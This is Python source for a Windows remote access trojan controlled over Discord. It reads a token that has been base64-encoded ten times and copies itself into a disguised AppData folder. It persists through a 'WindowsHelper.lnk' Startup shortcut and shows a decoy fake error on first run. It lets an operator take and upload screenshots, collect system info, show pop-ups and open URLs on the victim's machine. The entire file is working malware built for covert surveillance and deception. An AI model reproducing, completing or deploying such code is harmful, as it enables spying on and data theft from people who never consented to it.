import os
import sys
import uuid
import shutil
import subprocess
import platform
import ctypes
import threading
import datetime
import random
import discord
from discord.ext import commands
import psutil
import mss
import win32com.client
import webbrowser
import base64



def add_padding(s):
    return s + '=' * (-len(s) % 4)

path = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\token.txt')

with open(path, 'r') as file:
    token = file.read().strip()

for _ in range(10):
    token = add_padding(token) 
    token = base64.b64decode(token)
    token = token.decode('utf-8')  

        
# --- Install missing modules ---
def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module.split('.')[0])
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([
    ("discord", "discord.py"),
    ("psutil", "psutil"),
    ("mss", "mss"),
    ("win32com.client", "pywin32"),
])



# --- Config ---
FOLDER_NAME_CHOICES = ["settings", "windows_helper", "update_service", "config", "runtime", "cache"]
COMMANDS = [
    ("!ping", "Responds with 'Pong!'"),
    ("!help", "Lists commands you can use with the bot"),
    ("!alert", "Sends an alert window with your message"),
    ("!update", "Updates the script from the URL"),
    ("!ss", "Take a screenshot of the user's device"),
    ("!info", "Shows system info"),
    ("!openURL", "opens a URL")
]

FAKE_ERRORS = [
    "ModuleNotFoundError: No module named 'hook_lib'",
    "ImportError: cannot import name 'BypassFilter'",
    "AttributeError: 'NoneType' object has no attribute 'connect_hook'",
    "RuntimeError: Hook initialization failed due to invalid memory region",
    "TypeError: expected str, bytes or os.PathLike object, not NoneType",
    "NameError: name 'inject_payload' is not defined",
    "ValueError: attempted to read beyond memory bounds",
    "PermissionError: [Errno 13] Permission denied: '/dev/hook0'",
    "OSError: failed to allocate memory for hook thread",
    "KeyError: 'hook_signature' not found in config dictionary",
    "AssertionError: Hook verification failed during sanity check",
    "SyntaxError: unexpected indent in 'hook_core.py'",
    "ConnectionError: failed to establish secure IPC channel",
    "NotImplementedError: bypass_layer not supported on this platform",
]


# --- Startup Folder ---
def add_to_startup(script_path):
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shortcut_path = os.path.join(startup_path, "WindowsHelper.lnk")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = script_path
    shortcut.save()

# --- Target Folder Path ---
def get_appdata_path():
    base = os.getenv("APPDATA") if platform.system() == "Windows" else os.path.expanduser("~/.config")
    registry_path = os.path.join(base, "Microsoft", "uuid_folder_choice.txt")

    if os.path.exists(registry_path):
        with open(registry_path, "r") as f:
            folder = f.read().strip()
    else:
        folder = random.choice(FOLDER_NAME_CHOICES)
        os.makedirs(os.path.dirname(registry_path), exist_ok=True)
        with open(registry_path, "w") as f:
            f.write(folder)

    full_path = os.path.join(base, folder)
    os.makedirs(full_path, exist_ok=True)
    return full_path

# --- UUID Setup ---
def get_or_create_uuid():
    folder = get_appdata_path()
    uuid_path = os.path.join(folder, "uuid.txt")
    if os.path.exists(uuid_path):
        with open(uuid_path, "r") as f:
            return f.read().strip()
    else:
        new_uuid = str(uuid.uuid4())
        with open(uuid_path, "w") as f:
            f.write(new_uuid)
        # Show fake error only on first run / UUID creation
        threading.Thread(target=show_fake_error).start()
        return new_uuid

def show_fake_error():
    ctypes.windll.user32.MessageBoxW(
        0,
        random.choice(FAKE_ERRORS),
        "ERROR",
        0x1000 | 0x40 | 0x1
    )

# --- Self-move to folder ---
def ensure_self_in_folder():
    folder = get_appdata_path()
    script_name = os.path.basename(__file__)
    new_path = os.path.join(folder, script_name)

    if os.path.abspath(__file__) != os.path.abspath(new_path):
        shutil.copy2(__file__, new_path)
        add_to_startup(new_path)
        os.execv(sys.executable, [sys.executable, new_path])
    else:
        add_to_startup(new_path)

ensure_self_in_folder()
device_uuid = get_or_create_uuid()


# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    global device_category, commands_channel
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")

    guild = bot.guilds[0]
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }

    device_category = discord.utils.get(guild.categories, name=device_uuid)
    if not device_category:
        device_category = await guild.create_category(device_uuid, overwrites=overwrites)
        commands_channel = await guild.create_text_channel("commands", category=device_category)
        await guild.create_text_channel("info", category=device_category, overwrites=overwrites)

        embed = discord.Embed(title="Bot Commands", description="Available commands:", color=0x3258A8)
        for name, desc in COMMANDS:
            embed.add_field(name=name, value=desc, inline=False)
        await commands_channel.send(embed=embed)
    else:
        commands_channel = discord.utils.get(device_category.text_channels, name="commands")

def is_correct_category(ctx):
    return ctx.channel.category and ctx.channel.category.name == device_uuid

def get_uptime():
    return str(datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())).split('.')[0]

def get_system_info():
    return (
        f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
        f"Processor: {platform.processor()}\n"
        f"Python: {platform.python_version()}\n"
        f"Uptime: {get_uptime()}"
    )

@bot.command()
async def ping(ctx):
    if is_correct_category(ctx):
        await ctx.send("Pong!")

@bot.command()
async def help(ctx):
    if is_correct_category(ctx):
        embed = discord.Embed(title="Bot Commands", color=0x3258A8)
        for name, desc in COMMANDS:
            embed.add_field(name=name, value=desc, inline=False)
        await ctx.send(embed=embed)

@bot.command()
async def info(ctx):
    if is_correct_category(ctx):
        await ctx.send(f"```\n{get_system_info()}\n```")

@bot.command()
async def alert(ctx, *, message):
    if is_correct_category(ctx):
        def _show():
            ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40 | 0x1)
        threading.Thread(target=_show).start()
        await ctx.send("Alert sent.")

@bot.command()
async def ss(ctx):
    if is_correct_category(ctx):
        try:
            with mss.mss() as sct:
                filename = "screenshot.png"
                sct.shot(output=filename)
                await ctx.send(file=discord.File(filename))
                os.remove(filename)
        except Exception as e:
            await ctx.send(f"Screenshot error: {e}")

@bot.command()
async def openURL(ctx, *, url: str):
    if not is_correct_category(ctx):
        return
    
    # Try to open the URL on the local machine
    try:
        webbrowser.open(url)
        embed = discord.Embed(
            title="Opened URL",
            description=f"Successfully opened: {url}",
            color=discord.Color.green()
        )
    except Exception as e:
        embed = discord.Embed(
            title="Failed to open URL",
            description=str(e),
            color=discord.Color.red()
        )
    
    await ctx.send(embed=embed)




bot.run(token)
